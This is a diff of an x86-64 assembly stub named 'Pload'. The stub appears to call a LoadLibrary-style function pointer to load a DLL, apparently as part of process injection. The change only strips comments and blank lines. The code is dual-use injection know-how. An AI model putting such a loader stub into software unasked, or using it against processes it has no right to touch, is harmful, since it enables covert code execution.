@@ -20,12 +20,12 @@ Pload:
 	
 	start: 
 		pop rdx
-		sub rdx,22 # fix!
-	lea rcx,[rdx+60] # LoadDLL (fix)	
+		sub rdx,22 
+	lea rcx,[rdx+60] 
 	push rdx
         call qword ptr [rdx-8]
 	 pop rdx	
-     mov [rdx+60],rax   # salva o retorno da função lá (tem 4 bytes se for maior atropela esse stup, oq é de boa, após o return n importa mais)	 
+     mov [rdx+60],rax   	 
      popf	 
 	 pop r13
 	 pop r12
@@ -37,11 +37,8 @@ Pload:
 	 pop rcx 
 	 pop rbx
 	 pop rax	
-	 pop r15 #fix loadlib extra push
+	 pop r15 
 	 ret 
-
-	
-
 	
 	.globl	Pload_stub
 
